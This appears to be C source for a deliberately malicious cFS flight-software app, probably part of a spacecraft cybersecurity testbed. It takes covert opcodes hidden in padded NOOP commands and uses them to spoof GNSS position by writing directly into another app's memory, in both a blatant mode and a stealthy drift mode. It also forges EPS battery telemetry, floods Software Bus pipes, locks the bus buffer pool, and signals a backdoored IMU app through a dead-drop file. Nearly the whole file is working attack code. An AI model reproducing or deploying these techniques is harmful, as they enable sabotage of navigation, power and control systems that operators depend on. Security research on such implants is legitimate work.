 * LastBusAlt is not in the HK layout, so we skip it.
 *
 * Writes are taken under the victim's OWN HkDataMutex - we have its osal_id_t
 * straight out of its global struct, so we serialize cleanly against its
 * BusRx/HK tasks. This is never on the Software Bus, so a bus-mediation layer
 * cannot see or block it.
 *
 * DRIFT mode is anti-compounding: each cycle reads the current LastBusLat/Lon,
 * and only advances the offset accumulator when the victim's BusRx child task
 * has refreshed the cache (genuine != our last write). It then writes
 * genuine + accumulated_offset, so the result tracks the real orbit shape with a
 * slowly growing, plausible offset instead of runaway compounding. */
static GENERIC_GNSS_AppData_t *NOISY_ResolveGnssAppData(void)
{
    static GENERIC_GNSS_AppData_t *cached = NULL;
    void                          *handle;

    if (cached != NULL)
    {
        return cached;
    }

    /* RTLD_NOLOAD: return a handle to the already-resident module without
     * reloading it. dlsym on that handle returns the symbol address despite
     * the module having been loaded RTLD_LOCAL. The single extra dlopen
     * refcount is intentionally never balanced (the module never unloads). */
    handle = dlopen(GNSS_MODULE_SO, RTLD_NOW | RTLD_NOLOAD);
    if (handle == NULL)
    {
        return NULL; /* GNSS app not loaded (yet) */
    }

    cached = (GENERIC_GNSS_AppData_t *)dlsym(handle, "GENERIC_GNSS_AppData");
    return cached;
}

static void NOISY_GnssShadowTask(void)
{
    GENERIC_GNSS_AppData_t *gnss = NOISY_ResolveGnssAppData();
    double drift_lat        = 0.0;
    double drift_lon        = 0.0;
    double last_written_lat = 0.0;
    double last_written_lon = 0.0;
    bool   have_last        = false;

    if (gnss == NULL)
    {
        CFE_EVS_SendEvent(NOISY_EVT_GNSS_SPOOF, CFE_EVS_EventType_ERROR,
                          "NOISY_APP: GNSS spoof could not resolve %s:GENERIC_GNSS_AppData.",
                          GNSS_MODULE_SO);
        NOISY_GnssMode   = GNSS_MODE_NONE;
        NOISY_GnssTaskUp = false;
        return;
    }

    while (NOISY_GnssMode != GNSS_MODE_NONE)
    {
        /* If GNSS is not (yet) initialized its mutex id is undefined; do not take
         * an invalid id. Wait and retry so we self-heal if GNSS comes up later. */
        if (!OS_ObjectIdDefined(gnss->HkDataMutex))
        {
            OS_TaskDelay(GNSS_SHADOW_PERIOD_MS);
            continue;
        }

        if (OS_MutSemTake(gnss->HkDataMutex) == OS_SUCCESS)
        {
            if (NOISY_GnssMode == GNSS_MODE_TELEPORT)
            {
                gnss->LastBusLat = GNSS_SPOOF_LAT;
                gnss->LastBusLon = GNSS_SPOOF_LON;
            }
            else /* GNSS_MODE_DRIFT */
            {
                double genuine_lat = gnss->LastBusLat;
                double genuine_lon = gnss->LastBusLon;

                /* Advance the offset only on a fresh genuine sample (BusRx wrote
                 * a value we did not). Exact != is safe: we wrote exactly
                 * last_written_*, and a parsed sim sample will not be bit-equal. */
                if (!have_last || genuine_lat != last_written_lat || genuine_lon != last_written_lon)
                {
                    if (fabs(drift_lat) < GNSS_DRIFT_LAT_CAP)
                    {
                        drift_lat += GNSS_DRIFT_LAT_STEP;
                    }
                    if (fabs(drift_lon) < GNSS_DRIFT_LON_CAP)
                    {
                        drift_lon += GNSS_DRIFT_LON_STEP;
                    }
                }

                gnss->LastBusLat = genuine_lat + drift_lat;
                gnss->LastBusLon = genuine_lon + drift_lon;
                last_written_lat = gnss->LastBusLat;
                last_written_lon = gnss->LastBusLon;
                have_last        = true;
            }
            OS_MutSemGive(gnss->HkDataMutex);
        }
        OS_TaskDelay(GNSS_SHADOW_PERIOD_MS);
    }
    NOISY_GnssTaskUp = false; /* task exits when spoof cleared; allow re-arm */
}

/* OPCODE_GNSS_SPOOF / OPCODE_GNSS_DRIFT - engage a persistent GNSS position
 * overwrite in the requested mode. Spawns the shadow task once; re-arming (even
 * into a different mode) reuses the live task by flipping NOISY_GnssMode, and the
 * task's local drift accumulators reset whenever it is (re)created. */
static void NOISY_StartGnssSpoof(NOISY_GnssMode_t mode)
{
    NOISY_GnssMode = mode;

    if (!NOISY_GnssTaskUp)
    {
        CFE_ES_TaskId_t tid = CFE_ES_TASKID_UNDEFINED;
        if (CFE_ES_CreateChildTask(&tid, "NOISY_GNSS_SHADOW", NOISY_GnssShadowTask, CFE_ES_TASK_STACK_ALLOCATE, 4096,
                                   120, 0) == CFE_SUCCESS)
        {
            NOISY_GnssTaskUp = true;
        }
        else
        {
            NOISY_GnssMode = GNSS_MODE_NONE; /* could not arm */
            return;
        }
    }

    if (mode == GNSS_MODE_TELEPORT)
    {
        CFE_EVS_SendEvent(NOISY_EVT_GNSS_SPOOF, CFE_EVS_EventType_INFORMATION,
                          "NOISY_APP: GNSS position TELEPORT ENGAGED via direct memory write "
                          "(lat=%.4f lon=%.4f). Send opcode 0x00 to clear.",
                          (double)GNSS_SPOOF_LAT, (double)GNSS_SPOOF_LON);
    }
    else
    {
        CFE_EVS_SendEvent(NOISY_EVT_GNSS_SPOOF, CFE_EVS_EventType_INFORMATION,
                          "NOISY_APP: GNSS position DRIFT ENGAGED via direct memory write "
                          "(step=%.4f deg/cycle cap=%.2f deg). Send opcode 0x00 to clear.",
                          (double)GNSS_DRIFT_LAT_STEP, (double)GNSS_DRIFT_LAT_CAP);
    }
}

/* Dispatch on the covert opcode byte. */
static void NOISY_APP_RunScenario(uint8 opcode)
{
    switch (opcode)
    {
        case OPCODE_DORMANT:
            /* stealth: act on nothing; also stop a running EPS override. */
            if (NOISY_OverrideOn)
            {
                NOISY_OverrideOn = false;
                CFE_EVS_SendEvent(NOISY_EVT_OVERRIDE, CFE_EVS_EventType_INFORMATION,
                                  "NOISY_APP: EPS override CLEARED.");
            }
            /* ...and stop a running GNSS spoof/drift (the shadow task self-exits). */
            if (NOISY_GnssMode != GNSS_MODE_NONE)
            {
                NOISY_GnssMode = GNSS_MODE_NONE;
                CFE_EVS_SendEvent(NOISY_EVT_GNSS_SPOOF, CFE_EVS_EventType_INFORMATION,
                                  "NOISY_APP: GNSS position overwrite CLEARED.");
            }
            break;

        case OPCODE_EPS_SPOOF:
            NOISY_SpoofEpsHk();
            break;

        case OPCODE_EPS_OVERRIDE:
            /* Persistent: shadow every genuine EPS HK from now on (handled in
             * the main loop). One EVS event here; not one per shadow. */
            NOISY_OverrideOn = true;
            CFE_EVS_SendEvent(NOISY_EVT_OVERRIDE, CFE_EVS_EventType_INFORMATION,
                              "NOISY_APP: EPS override ENGAGED (battery=%u mV). "
                              "Send opcode 0x00 to clear.",
                              (unsigned int)OVERRIDE_BATTERY_MV);
            break;

        case OPCODE_SB_FLOOD:
            NOISY_PipeFlood();  /* phase 1: flood other apps' cmd pipes (SB_ACL-gated publish) */
            NOISY_SbPoolLock(); /* phase 2: DESTRUCTIVE - lock the SB buffer pool */
            break;

        case OPCODE_IMU_BIAS:
            /* Covert channel: silent file write (no EVS). The backdoored IMU
             * app picks it up off /ram and biases its own telemetry. */
            NOISY_WriteImuDeadDrop();
            break;

        case OPCODE_GNSS_SPOOF:
            /* Persistent: directly overwrite the peer GNSS app's cached position
             * with a blatant teleport (no Software Bus, so SB_ACL cannot block it). */
            NOISY_StartGnssSpoof(GNSS_MODE_TELEPORT);
            break;

        case OPCODE_GNSS_DRIFT:
            /* Persistent: same direct-memory vector, but a slow plausible drift
             * (genuine + growing offset) that a range check will not catch. */
            NOISY_StartGnssSpoof(GNSS_MODE_DRIFT);
            break;

        default:
            CFE_EVS_SendEvent(NOISY_EVT_UNKNOWN, CFE_EVS_EventType_INFORMATION,
                              "NOISY_APP: unknown opcode 0x%02X (ignored).", (unsigned int)opcode);
            break;
    }
}

void NOISY_APP_Main(void)
{
    uint32           RunStatus = CFE_ES_RunStatus_APP_RUN;
    CFE_SB_PipeId_t  CmdPipe;
    CFE_SB_Buffer_t *BufPtr;

    CFE_EVS_Register(NULL, 0, CFE_EVS_EventFilter_BINARY);
    CFE_ES_WaitForStartupSync(10000);

    CFE_SB_CreatePipe(&CmdPipe, 10, "NOISY_CMD_PIPE");
    /* Own command MID (direct path) + the sniffed legitimate carrier. */
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(NOISY_APP_CMD_MID), CmdPipe);
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(CARRIER_CMD_MID), CmdPipe);
    /* Also observe genuine EPS HK so OPCODE_EPS_OVERRIDE can shadow each packet
     * (this subscription is itself an IOC: a co-resident app reading EPS TLM). */
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(GENERIC_EPS_HK_TLM_MID), CmdPipe);

    CFE_EVS_SendEvent(NOISY_EVT_INIT, CFE_EVS_EventType_INFORMATION,
                      "NOISY_APP: Initialized. CMD MID 0x%04X, sniffing carrier 0x%04X.",
                      (unsigned int)NOISY_APP_CMD_MID, (unsigned int)CARRIER_CMD_MID);

    while (CFE_ES_RunLoop(&RunStatus) == true)
    {
        if (CFE_SB_ReceiveBuffer(&BufPtr, CmdPipe, CFE_SB_PEND_FOREVER) != CFE_SUCCESS)
        {
            continue;
        }

        CFE_SB_MsgId_t    MsgId   = CFE_SB_INVALID_MSG_ID;
        CFE_MSG_FcnCode_t FcnCode = 0;
        size_t            Size    = 0;

        CFE_MSG_GetMsgId(&BufPtr->Msg, &MsgId);
        CFE_MSG_GetFcnCode(&BufPtr->Msg, &FcnCode);
        CFE_MSG_GetSize(&BufPtr->Msg, &Size);

        /*
         * Reactive EPS override (OPCODE_EPS_OVERRIDE): every time a GENUINE EPS
         * HK arrives, immediately emit a shadow with our chosen battery value.
         * Because SB delivery is last-writer-wins for any later sampler (LC's
         * actionpoint sample, COSMOS, DS), the shadow that follows each genuine
         * packet is the value they act on - so the spoof wins regardless of the
         * real publish rate. The BatteryVoltage guard stops us reacting to our
         * own shadow (we are subscribed to 0x091A too), which would loop.
         */
        if (NOISY_OverrideOn && CFE_SB_MsgIdToValue(MsgId) == GENERIC_EPS_HK_TLM_MID)
        {
            const NOISY_EpsHkMimic_t *in = (const NOISY_EpsHkMimic_t *)BufPtr;
            if (in->BatteryVoltage != OVERRIDE_BATTERY_MV)
            {
                NOISY_SendEpsHk(OVERRIDE_BATTERY_MV);
            }
            continue;
        }

        /*
         * Piggyback detection: a NOOP on the carrier MID that is longer than a
         * normal header-only NOOP carries a covert opcode in its trailing byte.
         * The same logic accepts a trailing byte on this app's own CMD MID, so
         * the scenario can also be driven directly for testing.
         */
        bool is_carrier_noop = (CFE_SB_MsgIdToValue(MsgId) == CARRIER_CMD_MID) && (FcnCode == CARRIER_NOOP_FC);
        bool is_own_cmd      = (CFE_SB_MsgIdToValue(MsgId) == NOISY_APP_CMD_MID);

        if ((is_carrier_noop || is_own_cmd) && (Size > sizeof(CFE_MSG_CommandHeader_t)))
        {
            uint8 opcode = ((const uint8 *)BufPtr)[Size - 1];

            NOISY_TriggerCount++;
            CFE_EVS_SendEvent(NOISY_EVT_PIGGYBACK, CFE_EVS_EventType_INFORMATION,
                              "NOISY_APP: piggyback opcode 0x%02X on MID 0x%04X "
                              "(len %u, count %u).",
                              (unsigned int)opcode, (unsigned int)CFE_SB_MsgIdToValue(MsgId), (unsigned int)Size,
                              (unsigned int)NOISY_TriggerCount);

            NOISY_APP_RunScenario(opcode);
        }
        /* Normal-length carrier traffic: ignore (legitimate ops untouched). */
    }

    CFE_ES_ExitApp(RunStatus);
}
